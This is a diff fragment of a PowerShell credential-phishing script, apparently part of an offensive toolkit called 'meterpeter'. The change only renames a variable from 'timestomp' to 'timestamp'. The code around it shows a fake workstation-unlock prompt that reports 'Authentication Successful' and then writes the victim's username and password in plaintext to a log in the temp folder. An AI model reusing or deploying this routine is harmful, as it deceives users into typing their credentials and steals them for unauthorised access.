@@ -50,12 +50,12 @@ while ($counter -lt '1000000000')
       $logpath = Test-Path -Path "$env:tmp\CredsPhish.log";If($logpath -eq $True){Remove-Item $env:tmp\CredsPhish.log -Force}
       $msgbox = [System.Windows.Forms.MessageBox]::Show("Invalid Credentials, Please try again.", "$Account", [System.Windows.Forms.MessageBoxButtons]::OK, [System.Windows.Forms.MessageBoxIcon]::Warning)
     }else{
-      $timestomp = Get-Date;
+      $timestamp = Get-Date;
       $msgbox = [System.Windows.Forms.MessageBox]::Show("Authentication Successful, UnLocking WorkStation.", "$Account", [System.Windows.Forms.MessageBoxButtons]::OK, [System.Windows.Forms.MessageBoxIcon]::Information)
       echo "" > $env:tmp\CredsPhish.log
       echo "meterpeter - CredsPhish" >> $env:tmp\CredsPhish.log
       echo "-----------------------" >> $env:tmp\CredsPhish.log
-      echo "TimeStomp : $timestomp" >> $env:tmp\CredsPhish.log
+      echo "TimeStamp : $timestamp" >> $env:tmp\CredsPhish.log
       echo "username  : $user" >> $env:tmp\CredsPhish.log
       echo "password  : $pass" >> $env:tmp\CredsPhish.log
       start explorer.exe
